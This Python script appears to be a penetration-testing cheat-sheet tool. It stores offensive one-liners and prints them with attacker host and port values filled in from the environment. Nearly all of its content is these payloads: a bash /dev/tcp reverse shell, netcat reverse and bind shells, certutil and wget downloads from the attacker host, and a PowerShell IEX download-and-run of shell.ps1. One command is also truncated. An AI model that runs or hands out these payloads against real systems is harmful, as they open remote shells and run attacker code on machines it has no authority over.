#!/usr/bin/env python3

from re import match
import argparse
import os
import re

LHOST=os.environ.get("LHOST")
LPORT=os.environ.get("LPORT")
RHOST=os.environ.get("RHOST")

Commands = {
    "bash": "bash -i >& /dev/tcp/$LHOST/$LPORT 2>&1" ,
    "certutil": "certutil -urlcache -split -f http://$LHOST/" ,
    "netcat-bind": "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/" ,
    "netcat-rev":  "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f" ,
    "ps_download": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/','')\"" ,
    "ps_downx": "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/shell.ps1')\"" ,
    "wget": "wget http://$LHOST:80/" ,
}

def replace(input):
    output = input
    output = output.replace("$LHOST", LHOST)
    output = output.replace("$LPORT", LPORT)
    output = output.replace("$RHOST", RHOST)
    return output


def main(args):
    cmd = args.cmd
    if args.list:
        print("\n#\n# COMMAND LIST\n#\n")
        for key in Commands.keys():
            print(f'{key : <20} : {Commands[key]}')
        exit 
    if cmd:
        if cmd == "all":
            print("\n#\n# ALL COMMANDS\n#\n")
            for key in Commands.keys():
                print(replace(Commands[key]))
        elif cmd in Commands:
            print(replace(Commands[cmd]))
        else:
            print("Command not found")

if __name__ == "__main__":
    parser = argparse.ArgumentParser('Command player')
    parser.add_argument('-l', '--list', dest='list', action='store_true')
    parser.add_argument('cmd', metavar='Command',nargs='?', type=str, help='Choose a command to play')
    args = parser.parse_args()
    main(args)